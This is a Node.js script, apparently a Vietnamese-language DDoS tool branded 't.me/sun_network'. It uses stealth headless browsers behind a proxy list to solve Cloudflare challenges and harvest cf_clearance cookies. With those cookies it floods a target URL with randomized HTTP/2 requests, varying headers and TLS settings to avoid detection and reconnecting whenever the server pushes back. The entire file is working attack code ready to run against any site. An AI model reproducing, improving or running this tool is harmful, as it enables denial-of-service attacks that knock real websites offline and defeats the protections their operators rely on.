const errorHandler = error => {
};

process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

const COOKIES_MAX_RETRIES = 3;

const fs = require("fs");
const url = require('url');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const crypto = require('crypto');
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;

const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);

if (process.argv.length < 8) {
  console.clear();
  console.log("Cach dung: node slove.js <targetURL> <proxyFile> <threads> <duration> <rps> <floodDuration>");
  process.exit(1);
}

const targetURL = process.argv[2];
const proxyFile = process.argv[3];
const threads = +process.argv[4];
const duration = +process.argv[5];
const rps = +process.argv[6];
const floodDuration = +process.argv[7];

const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
const readLines = path => fs.readFileSync(path).toString().split(/\r?\n/).filter(line => line.trim() !== '');
const proxies = readLines(proxyFile);

let successfulProxies = [];

const secureOptionsList = [
  crypto.constants.SSL_OP_NO_RENEGOTIATION,
  crypto.constants.SSL_OP_NO_TICKET,
  crypto.constants.SSL_OP_NO_SSLv2,
  crypto.constants.SSL_OP_NO_SSLv3,
  crypto.constants.SSL_OP_NO_COMPRESSION,
  crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
  crypto.constants.SSL_OP_TLSEXT_PADDING,
  crypto.constants.SSL_OP_ALL
];

const statusCounts = {};
const countStatus = (status) => {
  if (!statusCounts[status]) {
    statusCounts[status] = 0;
  }
  statusCounts[status]++;
};

const printStatusCounts = () => {
  console.log(statusCounts);
  Object.keys(statusCounts).forEach(status => {
    statusCounts[status] = 0;
  });
};

function generateRandomString(minLength, maxLength) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });
  return randomStringArray.join('');
}

function shuffleObject(obj) {
  const keys = Object.keys(obj);
  const shuffledKeys = keys.reduce((acc, _, index, array) => {
    const randomIndex = Math.floor(Math.random() * (index + 1));
    acc[index] = acc[randomIndex];
    acc[randomIndex] = keys[index];
    return acc;
  }, []);
  const shuffledObject = Object.fromEntries(shuffledKeys.map((key) => [key, obj[key]]));
  return shuffledObject;
}

function maskString(proxy) {
  let [ip, port] = proxy.split(':');
  let segments = ip.split('.');
  segments[segments.length - 1] = '*'.repeat(segments[segments.length - 1].length);
  segments[segments.length - 2] = '*'.repeat(segments[segments.length - 2].length);
  port = '*'.repeat(port.length);
  let maskedIp = segments.join('.');
  return `${maskedIp}:${port}`;
}

async function handleCFChallenge(page) {
  let retryCount = 0;
  const maxRetries = 3;
  while (retryCount < maxRetries) {
    try {
      const captchaContainer = await page.$('body > div.main-wrapper > div > div > div > div', { timeout: 5000 });
      if (captchaContainer) {
        const { x, y } = await captchaContainer.boundingBox();
        await page.mouse.click(x + 20, y + 20);
        await sleep(3);
        const bd = await page.$('body > div.main-wrapper > div > div > div > div', { timeout: 5000 });
        if (!bd) {
          return;
        }
      } else {
        await page.reload({ waitUntil: 'domcontentloaded' });
        await sleep(5);
        retryCount++;
      }
    } catch (e) {
      await page.reload({ waitUntil: 'domcontentloaded' });
      await sleep(5);
      retryCount++;
    }
  }
}

async function handleUAM(page) {
  let retryCount = 0;
  const maxRetries = 3;
  while (retryCount < maxRetries) {
    try {
      const captchaContainer = await page.$('#verifyButton', { timeout: 5000 });
      if (captchaContainer) {
        const { x, y } = await captchaContainer.boundingBox();
        await page.mouse.click(x + 20, y + 20);
        await sleep(3);
        const bd = await page.$('#verifyButton', { timeout: 5000 });
        if (!bd) {
          return;
        }
      } else {
        await page.reload({ waitUntil: 'domcontentloaded' });
        await sleep(5);
        retryCount++;
      }
    } catch (e) {
      await page.reload({ waitUntil: 'domcontentloaded' });
      await sleep(5);
      retryCount++;
    }
  }
}

async function detectChallenge(browserProxy, page) {
  try {
    await page.waitForSelector('title', { timeout: 10000 });
    const title = await page.title();
    const content = await page.content();
    if (title === "Attention Required! | Cloudflare") {
      throw new Error("Proxy bi chan: " + maskString(browserProxy));
    }
    if (content.includes("challenge-platform") || content.includes("challenges.cloudflare.com")) {
      await handleCFChallenge(page);
    } else if (content.includes("/uam.js")) {
      await handleUAM(page);
    } else {
      await page.reload({ waitUntil: 'domcontentloaded' });
      await sleep(5);
    }
  } catch (e) {
    console.error("Loi khi phat hien challenge: " + e.message);
    await page.reload({ waitUntil: 'domcontentloaded' });
    await sleep(5);
  }
}

function flood(proxy, userAgent, cookie) {
  try {
    let parsed = url.parse(targetURL);
    let path = parsed.path;
    
    function randomDelay(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    let interval = randomDelay(100, 1000);

    function getChromeVersion(userAgent) {
      const chromeVersionRegex = /Chrome\/([\d.]+)/;
      const match = userAgent.match(chromeVersionRegex);
      if (match && match[1]) {
        return match[1];
      }
      return null;
    }

    const chromever = getChromeVersion(userAgent) || "126";
    const randValue = list => list[Math.floor(Math.random() * list.length)];
    const lang_header1 = [
      "en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", "es-ES,es;q=0.9",
      "it-IT,it;q=0.9", "pt-BR,pt;q=0.9", "ja-JP,ja;q=0.9", "zh-CN,zh;q=0.9", "ko-KR,ko;q=0.9",
      "ru-RU,ru;q=0.9", "ar-SA,ar;q=0.9", "hi-IN,hi;q=0.9", "ur-PK,ur;q=0.9", "tr-TR,tr;q=0.9",
      "id-ID,id;q=0.9", "nl-NL,nl;q=0.9", "sv-SE,sv;q=0.9", "no-NO,no;q=0.9", "da-DK,da;q=0.9",
      "fi-FI,fi;q=0.9", "pl-PL,pl;q=0.9", "cs-CZ,cs;q=0.9", "hu-HU,hu;q=0.9", "el-GR,el;q=0.9",
      "pt-PT,pt;q=0.9", "th-TH,th;q=0.9", "vi-VN,vi;q=0.9", "he-IL,he;q=0.9", "fa-IR,fa;q=0.9"
    ];

    let fixed = {
      ":method": "GET",
      ":authority": parsed.host,
      ":scheme": "https",
      ":path": path,
      "user-agent": userAgent,
      "upgrade-insecure-requests": "1",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "navigate",
      "sec-fetch-user": "?1",
      "sec-fetch-dest": "document",
      "cookie": cookie,
      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "sec-ch-ua": `"Chromium";v="${chromever}", "Not)A;Brand";v="8", "Chrome";v="${chromever}"`,
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": "Windows",
      "accept-encoding": "gzip, deflate, br, zstd",
      ...shuffleObject({
        "accept-language": randValue(lang_header1) + ",fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "purpure-secretf-id": "formula-" + generateRandomString(1, 2)
      }),
      "priority": "u=0, i",
      "te": "trailers"
    };

    let randomHeaders = {
      ...(Math.random() < 0.3 ? { "purpure-secretf-id": "formula-" + generateRandomString(1, 2) } : {}),
      ...(Math.random() < 0.5 ? { "sec-stake-fommunity": "bet-clc" } : {}),
      ...(Math.random() < 0.6 ? { [generateRandomString(1, 2) + "-SElF-DYNAMIC-" + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
      ...(Math.random() < 0.6 ? { ["stringclick-bad-" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) } : {}),
      ...(Math.random() < 0.6 ? { ["root-user" + generateRandomString(1, 2)]: "root-" + generateRandomString(1, 2) } : {}),
      ...(Math.random() < 0.6 ? { ["Java-x-seft" + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
      ...(Math.random() < 0.6 ? { ["HTTP-requests-with-unusual-HTTP-headers-or-URI-path-" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) } : {}),
      ...(Math.random() < 0.3 ? { [generateRandomString(1, 2) + "-C-Boost-" + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
      ...(Math.random() < 0.3 ? { ["sys-nodejs-" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) } : {})
    };

    let headerPositions = [
      "accept-language",
      "sec-fetch-user",
      "sec-ch-ua-platform",
      "accept",
      "sec-ch-ua",
      "sec-ch-ua-mobile",
      "accept-encoding",
      "purpure-secretf-id",
      "priority"
    ];

    let headersArray = Object.entries(fixed);
    let shuffledRandomHeaders = Object.entries(randomHeaders).sort(() => Math.random() - 0.5);

    shuffledRandomHeaders.forEach(([key, value]) => {
      let insertAfter = headerPositions[Math.floor(Math.random() * headerPositions.length)];
      let index = headersArray.findIndex(([k, v]) => k === insertAfter);
      if (index !== -1) {
        headersArray.splice(index + 1, 0, [key, value]);
      }
    });

    let dynHeaders = Object.fromEntries(headersArray);

    const regexPattern = /^([\w.-]+):(\w+)@([\w.-]+):(\d+)$/;
    const match = proxy.match(regexPattern);
    let connection;
    
    if (match) {
      const agent = new http.Agent({
        host: match[3],
        port: match[4],
        keepAlive: true,
        keepAliveMsecs: 500000000,
        maxSockets: 50000,
        maxTotalSockets: 100000
      });
      const Optionsreq = {
        agent: agent,
        method: "CONNECT",
        path: parsed.host + ":443",
        timeout: 1000,
        headers: {
          Host: parsed.host,
          "Proxy-Connection": "Keep-Alive",
          Connection: "Keep-Alive",
          "Proxy-Authorization": "Basic " + Buffer.from(match[1] + ":" + match[2]).toString("base64")
        }
      };
      connection = http.request(Optionsreq, (res) => {});
    } else {
      const proxyParts = proxy.split(":");
      const agent = new http.Agent({
        host: proxyParts[0],
        port: proxyParts[1],
        keepAlive: true,
        keepAliveMsecs: 500000000,
        maxSockets: 50000,
        maxTotalSockets: 100000
      });
      const Optionsreq = {
        agent: agent,
        method: "CONNECT",
        path: parsed.host + ":443",
        timeout: 1000,
        headers: {
          Host: parsed.host,
          "Proxy-Connection": "Keep-Alive",
          Connection: "Keep-Alive"
        }
      };
      connection = http.request(Optionsreq, (res) => {});
    }

    function createCustomTLSSocket(parsed, socket) {
      const tlsSocket = tls.connect({
        host: parsed.host,
        port: 443,
        servername: parsed.host,
        socket: socket,
        minVersion: "TLSv1.2",
        maxVersion: "TLSv1.3",
        ALPNProtocols: ["h2"],
        rejectUnauthorized: false,
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256",
        ecdhCurve: "X25519:P-256:P-384",
        ...(Math.random() < 0.5
          ? { secureOptions: secureOptionsList[Math.floor(Math.random() * secureOptionsList.length)] }
          : {})
      });
      tlsSocket.setKeepAlive(true, 600000 * 1000);
      return tlsSocket;
    }

    connection.on("connect", async function (res, socket) {
      const tlsSocket = createCustomTLSSocket(parsed, socket);
      const client = http2.connect(parsed.href, {
        createConnection: () => tlsSocket,
        settings: {
          headerTableSize: 65536,
          enablePush: false,
          initialWindowSize: 6291456,
          "NO_RFC7540_PRIORITIES": Math.random() < 0.5 ? true : "1"
        }
      }, (session) => {
        session.setLocalWindowSize(12517377 + 65535);
      });

      client.on("connect", () => {
        let clearr = setInterval(async () => {
          for (let i = 0; i < rps; i++) {
            const request = client.request({ ...dynHeaders }, {
              weight: Math.random() < 0.5 ? 42 : 256,
              depends_on: 0,
              exclusive: false
            });

            request.on("response", (res) => {
              countStatus(res[":status"]);
              if (res[":status"] === 429) {
                interval = 20000;
                client.close();
              }
            });
            request.end();
          }
        }, interval);

        let goawayCount = 0;
        client.on("goaway", (errorCode, lastStreamID, opaqueData) => {
          let backoff = Math.min(1000 * Math.pow(2, goawayCount), 15000);
          setTimeout(() => {
            goawayCount++;
            client.destroy();
            tlsSocket.destroy();
            socket.destroy();
            flood(proxy, userAgent, cookie);
          }, backoff);
        });

        client.on("close", () => {
          clearInterval(clearr);
          client.destroy();
          tlsSocket.destroy();
          socket.destroy();
          return flood(proxy, userAgent, cookie);
        });

        client.on("error", (error) => {
          client.destroy();
          tlsSocket.destroy();
          socket.destroy();
          return flood(proxy, userAgent, cookie);
        });
      });
    });

    connection.on("error", (error) => {
      connection.destroy();
    });
    connection.on("timeout", () => {
      connection.destroy();
    });
    connection.end();
  } catch (err) {
    console.log(err);
  }
}

async function getCfClearance(browserProxy) {
  const startTime = performance.now();
  const userAgents = [
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; 23127PN0CC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; RMX3851) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36'
  ];
  const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];

  let browser;
  let page;
  try {
    browser = await puppeteer.launch({
      headless: true,
      ignoreHTTPSErrors: true,
      detach: true,
      javaScriptEnabled: true,
      useAutomationExtension: true,
      args: [
        "--proxy-server=http://" + browserProxy,
        "--no-sandbox",
        "--no-first-run",
        "--no-default-browser-check",
        "--ignore-certificate-errors",
        "--disable-extensions",
        "--test-type",
        "--disable-gpu",
        "--disable-dev-shm-usage",
        "--disable-infobars",
        "--disable-blink-features=AutomationControlled",
        '--disable-features=IsolateOrigins,site-per-process',
        '--renderer-process-limit=1',
        '--mute-audio',
        '--enable-webgl',
        '--use-gl=disabled',
        '--color-scheme=dark',
        '--disable-notifications',
        '--disable-popup-blocking',
        '--disable-setuid-sandbox',
        '--disable-accelerated-2d-canvas',
        "--disable-browser-side-navigation",
        '--user-agent=' + randomUA
      ],
      ignoreDefaultArgs: ['--enable-automation']
    });
    [page] = await browser.pages();
    
    await page.goto(targetURL, {
      waitUntil: ["domcontentloaded"]
    });

    const title = await page.title();
    if (title === "Just a moment...") {
      await detectChallenge(browserProxy, page);
    }

    const cookies = await page.cookies(targetURL);
    const cfClearanceCookie = cookies.find(cookie => cookie.name === 'cf_clearance');
    const cookieString = cfClearanceCookie ? cfClearanceCookie.name + "=" + cfClearanceCookie.value : "Khong tim thay cf_clearance";
    const executionTime = ((performance.now() - startTime) / 1000).toFixed(2);

    console.log("-----------------------------------------");
    console.log(`[Target URL]: ${targetURL}`);
    console.log(`[Title]: ${title}`);
    console.log(`[Proxy solve]: ${browserProxy}`);
    console.log(`[Useragents solve]: ${randomUA}`);
    console.log(`[Cookie solve]: ${cookieString}`);
    console.log(`[Thoi gian solve xong]: ${executionTime} giay`);
    console.log("-----------------------------------------");

    if (cfClearanceCookie) {
      successfulProxies.push({
        proxy: browserProxy,
        userAgent: randomUA,
        cookie: cfClearanceCookie.name + "=" + cfClearanceCookie.value
      });
      fs.appendFileSync("cookie.txt", cfClearanceCookie.name + "=" + cfClearanceCookie.value + "\n");
    }

    return cfClearanceCookie ? cfClearanceCookie.name + "=" + cfClearanceCookie.value : null;

  } catch (exception) {
    console.error(`Loi trong qua trinh xu ly proxy ${maskString(browserProxy)}: ${exception.message}`);
    throw exception;
  } finally {
    if (browser) await browser.close();
  }
}

function startFlood() {
  console.log(`Bat dau flood voi ${successfulProxies.length} proxy`);
  setInterval(printStatusCounts, 3000);
  
  successfulProxies.forEach(proxyData => {
    setInterval(() => {
      flood(proxyData.proxy, proxyData.userAgent, proxyData.cookie);
    }, 10);
  });

  setTimeout(() => {
    console.log("Flood hoan thanh!");
    process.exit(0);
  }, floodDuration * 1000);
}

async function main() {
  const timeoutId = setTimeout(() => {
    console.log(`Da het thoi gian ${duration} giay solve. Bat dau flood voi ${successfulProxies.length} proxy.`);
    if (successfulProxies.length > 0) {
      startFlood();
    } else {
      console.log("Khong co proxy nao solve duoc cf_clearance de flood!");
      process.exit(0);
    }
  }, duration * 1000);

  if (proxies.length === 0) {
    console.log("Khong co proxy nao duoc tim thay.");
    clearTimeout(timeoutId);
    process.exit(1);
  }
  
  console.log(`
=====================================================
              t.me/sun_network
=====================================================
Target: ${targetURL}
Threads: ${threads}
Duration: ${duration}s
RPS: ${rps}
Flood Duration: ${floodDuration}s
=====================================================
`);
  
  const limitedGetCfClearance = async (proxy) => {
    try {
      await getCfClearance(proxy);
    } catch (e) {
      console.error(`Bo qua proxy ${maskString(proxy)} do loi: ${e.message}`);
    }
  };

  const tasks = proxies.map(limitedGetCfClearance);
  
  const chunks = [];
  for (let i = 0; i < tasks.length; i += threads) {
    chunks.push(tasks.slice(i, i + threads));
  }

  for (const chunk of chunks) {
    await Promise.all(chunk);
  }

  console.log(`Tat ca proxy da duoc xu ly. Co ${successfulProxies.length} proxy thanh cong.`);
  clearTimeout(timeoutId);
  
  if (successfulProxies.length > 0) {
    startFlood();
  } else {
    console.log("Khong co proxy nao solve duoc cf_clearance de flood!");
    process.exit(0);
  }
}

main();